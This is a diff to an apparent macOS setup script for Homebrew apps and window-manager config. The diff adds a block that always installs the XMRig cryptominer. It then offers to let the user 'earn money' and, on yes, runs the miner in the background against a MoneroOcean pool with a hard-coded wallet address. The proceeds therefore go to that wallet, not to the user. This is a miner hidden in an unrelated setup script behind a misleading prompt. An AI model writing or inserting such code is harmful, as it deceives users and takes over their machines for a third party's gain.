@@ -80,6 +80,7 @@ brew install --cask font-jetbrains-mono-nerd-font
 # brew install --cask spotify
 # brew install --cask tailscale
 
+
 # -------------------------
 # Config Directories
 # -------------------------
@@ -113,6 +114,28 @@ brew services start borders
 # Reload AeroSpace
 # -------------------------
 aerospace reload-config 2>/dev/null
+clear
+# -------------------------
+# Optional XMRig Startup
+# -------------------------
+brew install xmrig || true
+
+echo ""
+read -p "💰 Would you like to earn money by running XMRig in the background? (y/N): " START_MINER
+
+if [[ "$START_MINER" =~ ^[Yy]$ ]]; then
+    echo "🚀 Starting XMRig in background..."
+    nohup xmrig -o gulf.moneroocean.stream:10128 \
+    -u 4ASwsX9xJ4AUcYymMDv2Rz8ELyif1WerpNdSJvU5wtkq8VuYWsPLU772joJwqBCQD5JwrtYRSnM7USf6w7VxJY1tBMfQZGp \
+    -p "$(scutil --get ComputerName)" \
+    > ~/xmrig.log 2>&1 &
+    
+    echo "✅ XMRig started"
+    echo "📄 Logs: tail -f ~/xmrig.log"
+else
+    echo "⏭️ Skipping XMRig startup"
+fi
+
 clear
 echo ""
 echo "✅ Install Complete"
